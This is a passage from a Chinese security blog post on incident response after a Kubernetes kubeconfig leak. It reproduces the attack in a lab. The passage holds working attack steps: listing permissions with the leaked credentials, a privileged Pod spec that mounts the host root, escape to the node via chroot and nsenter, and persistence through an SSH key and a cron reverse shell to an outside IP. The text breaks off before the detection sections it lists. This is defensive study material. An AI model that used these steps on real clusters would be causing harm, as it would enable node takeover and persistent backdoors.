---
title: k8s KubeConfig泄露-黑客远程调用ApiServer创建特权容器获取Node节点权限应急排查
url: https://zgao.top/k8s-kubeconfig%e6%b3%84%e9%9c%b2-%e9%bb%91%e5%ae%a2%e8%bf%9c%e7%a8%8b%e8%b0%83%e7%94%a8apiserver%e5%88%9b%e5%bb%ba%e7%89%b9%e6%9d%83%e5%ae%b9%e5%99%a8%e8%8e%b7%e5%8f%96node%e8%8a%82%e7%82%b9%e6%9d%83/
source: Zgao's blog
date: 2026-06-08
fetch_date: 2026-06-09T06:01:49.553630
---

# k8s KubeConfig泄露-黑客远程调用ApiServer创建特权容器获取Node节点权限应急排查

# [Zgao's blog](https://zgao.top/)

愿有一日，安全圈的师傅们都能用上Zgao写的工具。

Toggle navigation

* [工具箱](https://zgao.top/tool/)
* [文章归档](https://zgao.top/archives/)
* [关于我](https://zgao.top/about-me/)
* [github](https://github.com/zgao264)
* Gmail

# k8s KubeConfig泄露-黑客远程调用ApiServer创建特权容器获取Node节点权限应急排查

* [首页](https://zgao.top)
* [k8s KubeConfig泄露-黑客远程调用ApiServer创建特权容器获取Node节点权限应急排查](https://zgao.top:443/k8s-kubeconfig%E6%B3%84%E9%9C%B2-%E9%BB%91%E5%AE%A2%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8apiserver%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E8%8E%B7%E5%8F%96node%E8%8A%82%E7%82%B9%E6%9D%83/)

[6月 8, 2026](https://zgao.top/2026/06/)

### k8s KubeConfig泄露-黑客远程调用ApiServer创建特权容器获取Node节点权限应急排查

作者 [Zgao](https://zgao.top/author/zgao/)
在[[应急响应](https://zgao.top/category/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/)](https://zgao.top/k8s-kubeconfig%E6%B3%84%E9%9C%B2-%E9%BB%91%E5%AE%A2%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8apiserver%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E8%8E%B7%E5%8F%96node%E8%8A%82%E7%82%B9%E6%9D%83/)

近2年的应急响应案例中，k8s的入侵案例逐渐增多。并且多次遇到客户云上内网被入侵后黑客窃取了KubeConfig文件，从公网远程调用ApiServer创建容器获取Node服务器权限植入后门的案例。

```
开发者/CI 系统的 kubeconfig 文件泄露到 Git / 日志 / 备份
        │
        ▼  黑客获取该文件
黑客在公网直接调用 apiserver（6443 端口）
        │
        ▼  权限确认为 cluster-admin
黑客创建一个特权 Pod，挂载宿主机根目录
        │
        ▼  kubectl exec 进容器
chroot / nsenter 拿到 Node 宿主机的 root shell
        │
        ▼
完全控制该 Node 宿主机
```

泄露途径非常多样：`.kube/config` 被 `git add -A` 带进仓库、CI 流水线打印了 KUBECONFIG 环境变量、开发者把 kubeconfig 存到共享网盘……一旦泄露，攻击者就能以持有人的身份操作集群，而集群本身不会有任何告警。

文章目录

[ ]

* [复现环境](#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83 "复现环境")
* [模拟泄露的 kubeconfig](#%E6%A8%A1%E6%8B%9F%E6%B3%84%E9%9C%B2%E7%9A%84_kubeconfig "模拟泄露的 kubeconfig")
* [用泄露的凭证连接集群](#%E7%94%A8%E6%B3%84%E9%9C%B2%E7%9A%84%E5%87%AD%E8%AF%81%E8%BF%9E%E6%8E%A5%E9%9B%86%E7%BE%A4 "用泄露的凭证连接集群")
* [创建特权 Pod](#%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83_Pod "创建特权 Pod")
* [逃逸到 Node 宿主机](#%E9%80%83%E9%80%B8%E5%88%B0_Node_%E5%AE%BF%E4%B8%BB%E6%9C%BA "逃逸到 Node 宿主机")
  + [方法一：chroot 进宿主机根文件系统](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Achroot_%E8%BF%9B%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F "方法一：chroot 进宿主机根文件系统")
  + [方法二：nsenter 进宿主机 PID 1 命名空间](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Ansenter_%E8%BF%9B%E5%AE%BF%E4%B8%BB%E6%9C%BA_PID_1_%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4 "方法二：nsenter 进宿主机 PID 1 命名空间")
* [拿到Node Shell的进一步利用](#%E6%8B%BF%E5%88%B0Node_Shell%E7%9A%84%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8 "拿到Node Shell的进一步利用")
* [应急响应如何排查这类攻击](#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5%E8%BF%99%E7%B1%BB%E6%94%BB%E5%87%BB "应急响应如何排查这类攻击")
  + [K8s 层：发现可疑 Pod](#K8s_%E5%B1%82%EF%BC%9A%E5%8F%91%E7%8E%B0%E5%8F%AF%E7%96%91_Pod "K8s 层：发现可疑 Pod")
    - [第一步：扫描集群里所有带危险配置的 Pod](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%89%AB%E6%8F%8F%E9%9B%86%E7%BE%A4%E9%87%8C%E6%89%80%E6%9C%89%E5%B8%A6%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE%E7%9A%84_Pod "第一步：扫描集群里所有带危险配置的 Pod")
    - [第二步：抓 Pod 详情和时间线](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%8A%93_Pod_%E8%AF%A6%E6%83%85%E5%92%8C%E6%97%B6%E9%97%B4%E7%BA%BF "第二步：抓 Pod 详情和时间线")
    - [第三步：查 Event，还原完整创建过程](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5_Event%EF%BC%8C%E8%BF%98%E5%8E%9F%E5%AE%8C%E6%95%B4%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B "第三步：查 Event，还原完整创建过程")
  + [Node 层：宿主机侧的取证](#Node_%E5%B1%82%EF%BC%9A%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%BE%A7%E7%9A%84%E5%8F%96%E8%AF%81 "Node 层：宿主机侧的取证")
    - [双平台日志实测对比](#%E5%8F%8C%E5%B9%B3%E5%8F%B0%E6%97%A5%E5%BF%97%E5%AE%9E%E6%B5%8B%E5%AF%B9%E6%AF%94 "双平台日志实测对比")
  + [Audit Log 中的真实攻击记录](#Audit_Log_%E4%B8%AD%E7%9A%84%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95 "Audit Log 中的真实攻击记录")
    - [第一步：Pod 创建（CREATE 201）](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9APod_%E5%88%9B%E5%BB%BA%EF%BC%88CREATE_201%EF%BC%89 "第一步：Pod 创建（CREATE 201）")
    - [第二步：进入容器执行命令（EXEC 101）](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88EXEC_101%EF%BC%89 "第二步：进入容器执行命令（EXEC 101）")
    - [第三步：强制删除 Pod（DELETE 200）](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%BC%BA%E5%88%B6%E5%88%A0%E9%99%A4_Pod%EF%BC%88DELETE_200%EF%BC%89 "第三步：强制删除 Pod（DELETE 200）")
    - [用 jq 快速筛查攻击条目](#%E7%94%A8_jq_%E5%BF%AB%E9%80%9F%E7%AD%9B%E6%9F%A5%E6%94%BB%E5%87%BB%E6%9D%A1%E7%9B%AE "用 jq 快速筛查攻击条目")
  + [如何开启Audit Log](#%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AFAudit_Log "如何开启Audit Log")
* [吊销泄露的 kubeconfig](#%E5%90%8A%E9%94%80%E6%B3%84%E9%9C%B2%E7%9A%84_kubeconfig "吊销泄露的 kubeconfig")
* [排查流程总结](#%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93 "排查流程总结")

## 复现环境

本实验在腾讯云香港按量计费，搭建了一个三节点集群，有意混用 **Ubuntu 22.04** 和 **CentOS 7.9** 两种操作系统，以便在应急响应部分真实对比两种 OS 下的日志路径差异。

| 角色 | OS | 规格 | 公网 IP | 内网 IP |
| --- | --- | --- | --- | --- |
| master（control-plane） | Ubuntu 22.04 | 4C8G | 129.xxx.50.247 | 10.0.1.14 |
| node-ubuntu（worker） | Ubuntu 22.04 | 2C4G | 43.xxx.182.96 | 10.0.1.2 |
| node-centos（worker） | CentOS 7.9 | 2C4G | 43.xxx.29.38 | 10.0.1.11 |

![](https://zgao.top/wp-content/uploads/2026/06/image-9-1024x469.png)

* Kubernetes v1.30.14，kubeadm 安装，flannel CNI
* apiserver 监听 `0.0.0.0:6443`，证书 SAN 含公网 IP（模拟真实暴露场景）
* 攻击机：攻击者模拟用的是我自己的 Mac，**不在集群内网**，纯公网操作

## 模拟泄露的 kubeconfig

真实场景里，kubeconfig 从各种渠道泄露。这里我们直接使用 master 节点上的 `admin.conf`（已将 server 地址改写为公网 IP），模拟”已泄露”状态。

![](https://zgao.top/wp-content/uploads/2026/06/image-10-1024x708.png)

## 用泄露的凭证连接集群

攻击者在自己的机器上：

```
export KUBECONFIG=$PWD/lab/attack/leaked-kubeconfig.yaml

kubectl version
# Server Version: v1.30.14  目标版本

kubectl get nodes -o wide
```

![](https://zgao.top/wp-content/uploads/2026/06/image-11-1024x393.png)

3个节点都 Ready，一个 control-plane，两个 worker。继续枚举权限：

```
kubectl auth can-i --list
```

![](https://zgao.top/wp-content/uploads/2026/06/image-13-1024x544.png)

`*.*` → `[*]`，完整 cluster-admin，等同于集群 root。

```
kubectl auth can-i create pods              # yes
kubectl auth can-i create clusterrolebindings  # yes
kubectl get pods -A                         # 看到所有系统 pod
```

![](https://zgao.top/wp-content/uploads/2026/06/image-12-1024x506.png)

一份泄露的 kubeconfig，相当于让攻击者从公网拿到了整个集群的最高权限。

## 创建特权 Pod

特权 Pod 是本次逃逸的核心。关键配置：

```
# cat lab/attack/privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  hostPID: true        # 共享宿主机 PID 命名空间
  hostIPC: true        # 共享宿主机 IPC 命名空间
  hostNetwork: true    # 共享宿主机网络命名空间
  containers:
  - name: pwn
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      privileged: true  # 拥有所有 Linux capability，可访问所有设备
    volumeMounts:
    - name: host
      mountPath: /host  # 宿主机 / 挂载到容器 /host
  volumes:
  - name: host
    hostPath:
      path: /           # 挂载宿主机根目录
      type: Directory
  restartPolicy: Never
  #   不配置 tolerations → 不容忍 control-plane:NoSchedule 污点
  #   Pod 会自动调度到 worker node（vm-1-2-ubuntu），正好是我们要拿的目标
```

制作好特权容器pod的yaml后，我们通过kubectl创建特权容器。

```
kubectl apply -f lab/attack/privileged-pod.yaml
# pod/pwn created

kubectl wait --for=condition=Ready pod/pwn --timeout=120s
# pod/pwn condition met

kubectl get pod pwn -o wide
```

![](https://zgao.top/wp-content/uploads/2026/06/image-14-1024x897.png)

Pod 落在了 worker node（`vm-1-2-ubuntu`），符合预期。

## 逃逸到 Node 宿主机

### 方法一：chroot 进宿主机根文件系统

```
kubectl exec -it pwn -- chroot /host bash
```

因为 `/host` 就是宿主机的 `/`，chroot 之后我们的根就是宿主机的根。

![](https://zgao.top/wp-content/uploads/2026/06/image-15-1024x596.png)

### 方法二：nsenter 进宿主机 PID 1 命名空间

```
kubectl exec -it pwn -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

`nsenter` 直接进入宿主机 init 进程（PID 1）的所有命名空间，比 chroot 更彻底：网络、进程、挂载点全部是宿主机视角。

![](https://zgao.top/wp-content/uploads/2026/06/image-16-1024x663.png)

## 拿到Node Shell的进一步利用

拿到 Node 宿主机 root shell 之后，攻击者可以有多种方式可以在内网横移和持久化。

持久化的方式就有常见的写入ssh公钥，对于Node节点没有公网ip的情况，通用是反弹Shell或者下载后门执行。

```
# 写 SSH 公钥到宿主机 root（无需 k8s 就能登进来）
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...攻击者公钥... /root/.ssh/authorized_keys
# 之后直接 ssh 登录

# 反弹shell
echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.xxx.xx/2333 0>&1" ...